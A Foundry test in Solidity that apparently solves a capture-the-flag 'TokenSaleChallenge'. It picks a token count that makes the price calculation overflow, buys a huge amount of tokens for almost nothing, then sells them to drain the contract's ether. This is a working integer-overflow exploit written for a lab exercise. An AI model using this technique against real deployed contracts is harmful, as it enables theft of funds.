// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;
pragma abicoder v2;

import {Test, console} from "forge-std/Test.sol";
import {TokenSaleChallenge} from "../../src/math/TokenSaleChallenge.sol";

contract TestTokenSaleChallenge is Test {
    TokenSaleChallenge challenge;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    function setUp() external {
        vm.deal(deployer, 1 ether);
        vm.deal(player, 1 ether);

        vm.prank(deployer);
        challenge = new TokenSaleChallenge{value: 1 ether}();
    }

    function test_Solution() external {
        uint256 PRICE_PER_TOKEN = 1 ether;
        // calculate number which will lead to an overflow in the require statement
        uint256 numTokens = (type(uint256).max / PRICE_PER_TOKEN) + 1;
        // calculate corresponding msg.value
        uint256 ethValue = numTokens * PRICE_PER_TOKEN;

        vm.startPrank(player);
        // buy huge amount of tokens because of the overflow
        challenge.buy{value: ethValue}(numTokens);
        // sell max amount of tokens by checking the balance of the challenge contract
        uint256 sellableAmount = address(challenge).balance / PRICE_PER_TOKEN;
        challenge.sell(sellableAmount);
        vm.stopPrank();

        assert(player.balance > 1 ether);
        assert(challenge.isComplete());
    }
}
